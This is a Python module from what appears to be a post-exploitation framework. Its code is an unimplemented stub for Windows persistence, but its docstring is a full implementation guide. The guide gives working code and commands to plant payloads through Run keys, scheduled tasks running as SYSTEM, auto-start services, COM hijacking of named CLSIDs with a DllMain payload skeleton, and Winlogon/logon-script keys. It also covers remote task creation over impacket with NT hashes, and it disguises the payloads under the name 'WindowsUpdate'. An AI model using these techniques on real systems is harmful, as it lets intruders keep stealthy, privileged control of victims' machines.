"""STUB — Windows registry / scheduled-task persistence.

Installs payload execution on the Windows host so it survives reboots.
Covers Run keys, scheduled tasks, service creation, and COM hijacking.

──────────────────────────────────────────────────────────────────────────────
IMPLEMENTATION GUIDE
──────────────────────────────────────────────────────────────────────────────

METHOD 1: HKCU Run key (no admin required, current user only)
-------------------------------------------------------------
  import winreg   # Windows only

  RUN_KEY = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

  def add_run_key(name: str, payload_path: str, hive=winreg.HKEY_CURRENT_USER):
      key = winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_SET_VALUE)
      winreg.SetValueEx(key, name, 0, winreg.REG_SZ, payload_path)
      winreg.CloseKey(key)

  add_run_key("WindowsUpdate", r"C:\\Users\\user\\AppData\\Local\\update.exe")

  # One-shot (runs once, then deletes itself):
  RUNONCE_KEY = r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
  add_run_key("Update", r"C:\\path\\payload.exe", hive=winreg.HKEY_CURRENT_USER)
  # Use RUNONCE_KEY instead of RUN_KEY

  # System-wide (requires admin):
  add_run_key("WindowsUpdate", r"C:\\payload.exe", hive=winreg.HKEY_LOCAL_MACHINE)

  # Via reg.exe (no Python winreg, works via shell task):
  #   reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  #       /v WindowsUpdate /t REG_SZ /d "C:\\payload.exe" /f


METHOD 2: Scheduled task (more reliable, survives user-specific restrictions)
------------------------------------------------------------------------------
  # Via schtasks.exe (works via shell task, no special libraries):
  import subprocess

  subprocess.run([
      "schtasks", "/create",
      "/tn", "WindowsUpdate",           # task name
      "/tr", r"C:\\path\\payload.exe",  # task to run
      "/sc", "onlogon",                 # trigger: onlogon | onstart | minute
      "/ru", "SYSTEM",                  # run as SYSTEM (requires admin)
      "/f",                             # force overwrite if exists
  ], capture_output=True)

  # Common /sc values:
  #   onlogon       — on user login (no admin needed for current user)
  #   onstart       — on system boot (requires admin to run as SYSTEM)
  #   minute        — every N minutes: /sc minute /mo 5
  #   daily         — daily at specified time: /sc daily /st 09:00

  # Via PowerShell (more options, works in constrained language mode):
  #   ps_cmd = (
  #     "$action  = New-ScheduledTaskAction -Execute 'C:\\\\path\\\\payload.exe'\n"
  #     "$trigger = New-ScheduledTaskTrigger -AtLogOn\n"
  #     "$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0\n"
  #     "Register-ScheduledTask -TaskName 'WindowsUpdate' -Action $action "
  #     "-Trigger $trigger -Settings $settings -RunLevel Highest -Force\n"
  #   )

  # Via impacket (remote task creation over DCE/RPC):
  from impacket.dcerpc.v5 import tsch, transport as imptransport
  rpctransport = imptransport.DCERPCTransportFactory(
      f"ncacn_np:{target_ip}[\\\\pipe\\\\atsvc]"
  )
  rpctransport.set_credentials(username, password, domain, lmhash, nthash)
  dce = rpctransport.get_dce_rpc()
  dce.connect(); dce.bind(tsch.MSRPC_UUID_TSCHS)
  # Use tsch.hSchRpcRegisterTask() with an XML task definition


METHOD 3: Windows service (requires admin, survives all logons)
---------------------------------------------------------------
  subprocess.run([
      "sc", "create", "WindowsUpdate",
      "binpath=", r"C:\\path\\payload.exe",
      "start=", "auto",
      "obj=", "LocalSystem",
  ])
  subprocess.run(["sc", "start", "WindowsUpdate"])

  # Registry equivalent (same result):
  # HKLM\\SYSTEM\\CurrentControlSet\\Services\\WindowsUpdate
  #   ImagePath = "C:\\path\\payload.exe"
  #   Start     = 2 (automatic) | 3 (manual) | 4 (disabled)
  #   Type      = 16 (SERVICE_WIN32_OWN_PROCESS)

  # Via impacket svcctl:
  from impacket.dcerpc.v5 import svcctl


METHOD 4: COM object hijacking (no admin, per-user, very stealthy)
------------------------------------------------------------------
  # When a process calls CoCreateInstance({CLSID}), Windows searches:
  #   1. HKCU\\Software\\Classes\\CLSID\\{CLSID}   (user-level, no admin)
  #   2. HKCR\\CLSID\\{CLSID}                       (system-level)
  # If we register our DLL at step 1, it wins before the system entry.

  # Step 1: Find a CLSID that a privileged process loads.
  # Use SysInternals Process Monitor: filter on "HKCR CLSID ... NAME NOT FOUND"
  # Popular targets: {B31118B2-1F49-48E5-B6F5-BC21CAEC56FB} (wuauclt),
  #                  {9BA05972-F6A8-11CF-A442-00A0C90A8F39} (ShellWindows)

  # Step 2: Register your DLL at the user-level key:
  CLSID_GUID = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
  reg_path = f"Software\\\\Classes\\\\CLSID\\\\{CLSID_GUID}\\\\InprocServer32"
  key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
  winreg.SetValueEx(key, "", 0, winreg.REG_SZ, r"C:\\path\\evil.dll")
  winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
  winreg.CloseKey(key)

  # Your evil.dll's DllMain will run whenever the target process instantiates the CLSID.
  # DllMain skeleton in C:
  #   BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
  #     if (dwReason == DLL_PROCESS_ATTACH)
  #       CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
  #     return TRUE; }


METHOD 5: Logon script via Group Policy registry key
-----------------------------------------------------
  # HKCU\\Environment\\UserInitMprLogonScript — runs on every logon
  winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ,
                    r"C:\\path\\payload.bat")

  # Winlogon notification (HKLM, requires admin):
  # HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
  #   Userinit = "C:\\Windows\\system32\\userinit.exe,C:\\path\\payload.exe,"


REMOVING ENTRIES
----------------
  winreg.DeleteValue(key, "WindowsUpdate")   # delete Run key entry
  subprocess.run(["schtasks", "/delete", "/tn", "WindowsUpdate", "/f"])
  subprocess.run(["sc", "delete", "WindowsUpdate"])


ARGS EXPECTED BY THIS MODULE
-----------------------------
  {
    "payload_path": r"C:\\path\\payload.exe",
    "method":       "run_key" | "scheduled_task" | "service" | "com_hijack",
    "name":         "WindowsUpdate",
    "hive":         "HKCU",    # or "HKLM" (requires admin)
    "target":       None,      # for remote via impacket: "192.168.1.10"
    "username":     None,      # remote auth
    "password":     None,
    "nt_hash":      None,
  }
"""

from post.base import ModuleResult, PostModule
from post.loader import register


@register
class RegistryPersistModule(PostModule):
    NAME = "persist/registry"
    DESCRIPTION = "STUB — Windows Run key / scheduled task / service / COM hijack persistence"
    PLATFORM = ["windows"]
    IMPLEMENTED = False

    def run(self, args: dict | None = None) -> ModuleResult:
        raise NotImplementedError(
            "See post/persist/registry.py docstring: winreg.SetValueEx for Run keys, "
            "schtasks.exe for scheduled tasks, or COM hijack via HKCU\\\\Classes\\\\CLSID."
        )
